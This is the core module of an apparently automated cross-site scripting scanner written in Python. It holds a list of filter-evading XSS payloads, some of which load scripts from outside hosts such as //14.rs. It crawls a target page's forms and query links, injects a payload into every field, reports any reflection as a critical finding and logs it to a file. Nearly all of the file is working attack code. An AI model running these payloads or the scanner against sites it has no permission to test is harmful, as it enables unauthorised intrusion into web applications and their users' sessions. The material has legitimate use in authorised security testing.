#!/usr/bin/env python
# -*- coding: utf-8 -*-


# Import Modules
from random import randint
from lib.Log import *
from bs4 import BeautifulSoup
from lib.helper import *
from lib.colors import *
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


# Style class
class Style:
    reset = '\033[0m'
    bold = '\033[01m'
    underline = '\033[04m'
    red = '\033[31m'
    blue = '\033[34m'
    cyan = '\033[36m'
    lightgrey = '\033[37m'
    darkgrey = '\033[90m'
    yellow = '\033[93m'


class core:

    @classmethod
    def generate(self, eff):
        FUNCTION = [
            "prompt(5000/200)",
            "alert(6000/3000)",
            "alert(document.cookie)",
            "prompt(document.cookie)",
            "console.log(5000/3000)",
            '<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z',
            '<d3"<"/onclick="1>[confirm``]"<">z',
            "<d3/onmouseenter=[2].find(confirm)>z",
            "<details open ontoggle=confirm()>",
            '<script y="><">/*<script* */prompt()</script',
            '<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z',
            '<a href="javascript%26colon;alert(1)">click',
            "<a href=javas&#99;ript:alert(1)>click",
            '<script/"<a"/src=data:=".<a,[8].some(confirm)>"',
            '<svg/x=">"/onload=confirm()//',
            "<--`<img/src=` onerror=confirm``> --!>",
            "<svg%0Aonload=%09((pro\u006dpt))()//",
            "<sCript x>(((confirm)))``</scRipt x>",
            '<svg </onload ="1> (_=prompt,_(1)) "">"',
            "<!--><script src=//14.rs>",
            "<embed src=//14.rs>",
            '<script x=">" src=//15.rs></script>',
            "<iframe/src onload = prompt(1)",
            "<x oncut=alert()>x",
            "<svg onload=write()>"
        ]
        if eff == 1:
            return FUNCTION[randint(5, 9)]

        elif eff == 2:
            return FUNCTION[randint(10, 14)]

        elif eff == 3:
            return FUNCTION[randint(15, 20)]

        elif eff == 4:
            return FUNCTION[randint(5, 9)]

        elif eff == 5:
            return FUNCTION[randint(10, 14)]

        elif eff == 6:
            return FUNCTION[randint(15, 20)]

    @classmethod
    def post_method(self):
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        vuln_logger = VulnerabilityLogger()
        for form in forms:
            try:
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "post":
                Log.warning("Target have form with POST method: " +
                            C + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info(
                                "Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + G +
                                     key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))

                Log.info("Sending payload (POST) method...")
                req = self.session.post(urljoin(self.url, action), data=keys)
                if self.payload in req.text:
                    print(f"""
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
{red}{bold}[Critical]{end}
{bold}{good}{bold} Detected XSS (POST) at : {blue}{urljoin(self.url, req.url)}{end}
{info}{bold} Payload : \033[91m{self.payload}{end}
{info}{bold} Exploit : \033[91m{key["name"] + N + " value: " + G + self.payload}{end}
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
""")

                    vuln_logger.log_vulnerability("POST", urljoin(self.url, req.url), self.payload, keys)
                else:
                    Log.info(
                        "This page is safe from XSS (POST) attack but not 100% yet...")

    @classmethod
    def get_method_form(self):
        vuln_logger = VulnerabilityLogger()
        bsObj = BeautifulSoup(self.body, "html.parser")
        forms = bsObj.find_all("form", method=True)
        for form in forms:
            try:
                action = form["action"]
                action = form["action"]
            except KeyError:
                action = self.url

            if form["method"].lower().strip() == "get":
                Log.warning("Target have form with GET method: " +
                            C + urljoin(self.url, action))
                Log.info("Collecting form input key.....")

                keys = {}
                for key in form.find_all(["input", "textarea"]):
                    try:
                        if key["type"] == "submit":
                            Log.info(
                                "Form key name: " + G + key["name"] + N + " value: " + G + "<Submit Confirm>")
                            keys.update({key["name"]: key["name"]})

                        else:
                            Log.info("Form key name: " + G +
                                     key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})

                    except Exception as e:
                        Log.info("Internal error: " + str(e))
                        try:
                            Log.info("Form key name: " + G +
                                     key["name"] + N + " value: " + G + self.payload)
                            keys.update({key["name"]: self.payload})
                        except KeyError as e:
                            Log.info("Internal error: " + str(e))

                Log.info("Sending payload (GET) method...")
                req = self.session.get(urljoin(self.url, action), params=keys)
                if self.payload in req.text:
                    print(f"""
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
{red}{bold}[Critical]{end}
{bold}{good}{bold} Detected XSS (GET) at : {blue}{urljoin(self.url, req.url)}{end}
{info}{bold} Payload : \033[91m{self.payload}{end}
{info}{bold} Exploit : \033[91m{keys}{end}
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
""")

                    vuln_logger.log_vulnerability("GET", urljoin(self.url, req.url), self.payload, keys)
                else:
                    Log.info("Not vulnerable.")

    @classmethod
    def get_method(self):
        vuln_logger = VulnerabilityLogger()
        bsObj = BeautifulSoup(self.body, "html.parser")
        links = bsObj.find_all("a", href=True)
        for a in links:
            url = a["href"]
            if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith(
                    "mailto:") is False:
                base = urljoin(self.url, a["href"])
                query = urlparse(base).query
                if query != "":
                    Log.warning("Found link with query: " + G +
                                query + N + " Maybe a vulnerable XSS point.")

                    query_payload = query.replace(
                        query[query.find("=") + 1:len(query)], self.payload, 1)
                    test = base.replace(query, query_payload, 1)

                    query_all = base.replace(query, urlencode(
                        {x: self.payload for x in parse_qs(query)}))

                    Log.info("Query (GET) : " + test)
                    Log.info("Query (GET) : " + query_all)

                    _respon = self.session.get(test)
                    if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
                        print(f"""
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
{red}{bold}[Critical]{end}
{bold}{good}{bold} Detected XSS (GET) at : {blue}{_respon.url}{end}
\033[91m#{yellow}{bold}----------------------------------------------------------------------{end}\033[91m#{end}
""")

                        vuln_logger.log_vulnerability("GET", _respon.url, self.payload)
                    else:
                        Log.info(
                            "This page is safe from XSS (GET) attack but not 100% yet...")

    @classmethod
    def main(self, url, proxy, headers, payload, cookie, method=2):

        print(W + "*" * 15)
        self.payload = payload
        self.url = url

        self.session = session(proxy, headers, cookie)
        Log.info("Checking connection to: " + Y + url)
        try:
            ctr = self.session.get(url)
            self.body = ctr.text
        except Exception as e:
            Log.high("Internal error: " + str(e))
            return

        if ctr.status_code > 400:
            Log.info("Connection failed " + G + str(ctr.status_code))
            return
        else:
            Log.info("Connection estabilished " + G + str(ctr.status_code))

        if method >= 2:
            self.post_method()
            self.get_method()
            self.get_method_form()

        elif method == 1:
            self.post_method()

        elif method == 0:
            self.get_method()
            self.get_method_form()


class VulnerabilityLogger:
    @classmethod
    def log_vulnerability(cls, method, url, payload, keys=None):
        vulnerabilities_dir = "vulnerabilities"
        os.makedirs(vulnerabilities_dir, exist_ok=True)

        with open(os.path.join(vulnerabilities_dir, "vulnerabilities.txt"), "a") as f:
            f.write(f"---------------[Xss found!]-----------------\n")
            f.write(f"Method: {method}\n")
            f.write(f"URL: {url}\n")
            f.write(f"Payload: {payload}\n")
            if keys:
                f.write(f"Keys: {keys}\n")
            f.write("\n")
